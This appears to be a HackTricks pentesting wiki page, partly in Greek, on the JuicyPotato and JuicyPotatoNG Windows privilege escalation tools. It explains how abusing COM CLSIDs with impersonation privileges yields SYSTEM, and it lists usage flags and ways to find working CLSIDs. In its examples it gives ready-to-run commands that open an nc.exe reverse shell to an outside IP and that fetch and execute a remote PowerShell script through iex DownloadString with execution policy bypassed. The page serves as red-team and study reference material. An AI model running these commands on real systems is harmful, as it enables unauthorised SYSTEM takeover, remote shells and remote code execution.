# JuicyPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING] > JuicyPotato is legacy. It generally works on Windows versions up to Windows 10 1803 / Windows Server 2016. Microsoft changes shipped starting in Windows 10 1809 / Server 2019 broke the original technique. For those builds and newer, consider modern alternatives such as PrintSpoofer, RoguePotato, SharpEfsPotato/EfsPotato, GodPotato and others. See the page below for up-to-date options and usage.


{{#ref}}
roguepotato-and-printspoofer.md
{{#endref}}

## Juicy Potato (κατάχρηση των χρυσών προνομίων) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_A sugared version of_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, with a bit of juice, i.e. **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_

#### You can download juicypotato from [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### Compatibility quick notes

- Λειτουργεί αξιόπιστα έως Windows 10 1803 και Windows Server 2016 όταν το τρέχον context έχει SeImpersonatePrivilege ή SeAssignPrimaryTokenPrivilege.
- Broken by Microsoft hardening in Windows 10 1809 / Windows Server 2019 and later. Prefer the alternatives linked above for those builds.

### Summary <a href="#summary" id="summary"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) leverages the privilege escalation chain based on [`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) having the MiTM listener on `127.0.0.1:6666` and when you have `SeImpersonate` or `SeAssignPrimaryToken` privileges. During a Windows build review we found a setup where `BITS` was intentionally disabled and port `6666` was taken.

We decided to weaponize [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG): **Say hello to Juicy Potato**.

> For the theory, see [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) and follow the chain of links and references.

We discovered that, other than `BITS` there are a several COM servers we can abuse. They just need to:

1. να μπορούν να δημιουργηθούν από τον τρέχοντα χρήστη, συνήθως έναν “service user” ο οποίος έχει impersonation privileges
2. να υλοποιούν το interface `IMarshal`
3. να τρέχουν ως elevated user (SYSTEM, Administrator, …)

After some testing we obtained and tested an extensive list of [interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) on several Windows versions.

### Juicy details <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato allows you to:

- **Target CLSID** _pick any CLSID you want._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _you can find the list organized by OS._
- **COM Listening port** _define COM listening port you prefer (instead of the marshalled hardcoded 6666)_
- **COM Listening IP address** _bind the server on any IP_
- **Process creation mode** _depending on the impersonated user’s privileges you can choose from:_
- `CreateProcessWithToken` (needs `SeImpersonate`)
- `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
- `both`
- **Process to launch** _launch an executable or script if the exploitation succeeds_
- **Process Argument** _customize the launched process arguments_
- **RPC Server address** _for a stealthy approach you can authenticate to an external RPC server_
- **RPC Server port** _useful if you want to authenticate to an external server and firewall is blocking port `135`…_
- **TEST mode** _mainly for testing purposes, i.e. testing CLSIDs. It creates the DCOM and prints the user of token. See_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)

### Usage <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### Τελικά σχόλια <a href="#final-thoughts" id="final-thoughts"></a>

[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**

Αν ο χρήστης έχει `SeImpersonate` ή `SeAssignPrimaryToken` προνόμια τότε είστε **SYSTEM**.

Είναι σχεδόν αδύνατο να αποτραπεί η κατάχρηση όλων αυτών των COM Servers. Θα μπορούσατε να σκεφτείτε να τροποποιήσετε τα δικαιώματα αυτών των αντικειμένων μέσω του `DCOMCNFG` αλλά καλή τύχη, αυτό θα είναι πρόκληση.

Η πραγματική λύση είναι να προστατέψετε ευαίσθητους λογαριασμούς και εφαρμογές που τρέχουν υπό τους λογαριασμούς `* SERVICE`. Το να σταματήσετε το `DCOM` σίγουρα θα παρεμπόδιζε αυτό το exploit αλλά μπορεί να έχει σοβαρό αντίκτυπο στο υποκείμενο OS.

From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## JuicyPotatoNG (2022+)

JuicyPotatoNG re-introduces a JuicyPotato-style local privilege escalation on modern Windows by combining:
- DCOM OXID resolution to a local RPC server on a chosen port, avoiding the old hardcoded 127.0.0.1:6666 listener.
- An SSPI hook to capture and impersonate the inbound SYSTEM authentication without requiring RpcImpersonateClient, which also enables CreateProcessAsUser when only SeAssignPrimaryTokenPrivilege is present.
- Tricks to satisfy DCOM activation constraints (e.g., the former INTERACTIVE-group requirement when targeting PrintNotify / ActiveX Installer Service classes).

Important notes (evolving behavior across builds):
- September 2022: Initial technique worked on supported Windows 10/11 and Server targets using the “INTERACTIVE trick”.
- January 2023 update from the authors: Microsoft later blocked the INTERACTIVE trick. A different CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) restores exploitation but only on Windows 11 / Server 2022 according to their post.

Basic usage (more flags in the help):
```
JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
# Useful helpers:
#  -b  Bruteforce all CLSIDs (testing only; spawns many processes)
#  -s  Scan for a COM port not filtered by Windows Defender Firewall
#  -i  Interactive console (only with CreateProcessAsUser)
```
Εάν στοχεύετε Windows 10 1809 / Server 2019 όπου το κλασικό JuicyPotato έχει επιδιορθωθεί, προτιμήστε τις εναλλακτικές που αναφέρονται στην κορυφή (RoguePotato, PrintSpoofer, EfsPotato/GodPotato, κ.λπ.). Το NG μπορεί να είναι κατά περίπτωση, ανάλογα με το build και την κατάσταση της υπηρεσίας.

## Παραδείγματα

Σημείωση: Επισκεφθείτε [this page](https://ohpe.it/juicy-potato/CLSID/) για μια λίστα CLSIDs προς δοκιμή.

### Πάρτε ένα nc.exe reverse shell
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### Powershell rev
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### Εκκίνηση νέου CMD (αν έχετε πρόσβαση RDP)

![](<../../images/image (300).png>)

## Προβλήματα CLSID

Συχνά, το προεπιλεγμένο CLSID που χρησιμοποιεί το JuicyPotato **δεν λειτουργεί** και το exploit αποτυγχάνει. Συνήθως απαιτούνται πολλαπλές προσπάθειες για να βρεθεί ένα **λειτουργικό CLSID**. Για να πάρετε μια λίστα με CLSIDs για ένα συγκεκριμένο λειτουργικό σύστημα, επισκεφθείτε αυτή τη σελίδα:

- [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)

### **Έλεγχος CLSIDs**

Πρώτα, θα χρειαστείτε μερικά εκτελέσιμα αρχεία εκτός από το juicypotato.exe.

Κατεβάστε το [Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) και φορτώστε το στη συνεδρία PS σας, και κατεβάστε και εκτελέστε το [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1). Αυτό το script θα δημιουργήσει μια λίστα πιθανών CLSIDs για δοκιμή.

Στη συνέχεια κατεβάστε [test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat)(αλλάξτε τη διαδρομή προς τη λίστα CLSID και προς το εκτελέσιμο του juicypotato) και εκτελέστε το. Θα αρχίσει να δοκιμάζει κάθε CLSID, και **όταν αλλάξει ο αριθμός θύρας, αυτό θα σημαίνει ότι το CLSID δούλεψε**.

**Ελέγξτε** τα CLSIDs που λειτουργούν **χρησιμοποιώντας την παράμετρο -c**

## Αναφορές

- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)

{{#include ../../banners/hacktricks-training.md}}
